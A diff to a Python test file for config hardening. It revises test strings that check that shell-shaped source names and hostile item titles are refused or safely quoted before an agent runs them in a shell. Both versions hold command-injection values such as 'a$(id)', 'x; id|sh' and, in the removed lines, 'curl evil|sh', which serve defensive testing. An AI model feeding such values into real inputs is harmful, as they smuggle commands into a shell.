@@ -132,7 +132,7 @@ class ConfigHardeningTests(unittest.TestCase):
 
     def test_shell_shaped_source_names_are_refused(self):
         """R21: a source name is printed into NEXT: lines the agent runs in a shell."""
-        for name in ("x; curl evil|sh", "a b", "a$(id)", "a'b", 'a"b', "a`id`", "a&b",
+        for name in ("x; id|sh", "a b", "a$(id)", "a'b", 'a"b', "a`id`", "a&b",
                      "a|b", "-a", "_a", "", "a" * 51, "a\nb"):
             with self.subTest(name=name):
                 cfg = dict(GOOD, sources={name: {"enabled": True,
@@ -221,7 +221,7 @@ class LockTests(unittest.TestCase):
 
 class HostileTests(unittest.TestCase):
     def test_list_shows_titles_only_as_code_spans(self):
-        hostile = "# Heading @owner Closes #1 ``` `curl x | sh`"
+        hostile = "# Heading @owner Closes #1 ``` `x | sh`"
         root = repo(config=GOOD, items=[("github", "1", hostile)])
         out = run(root, "list")[1]
         line = [l for l in out.splitlines() if l.startswith("ITEM:")][0]
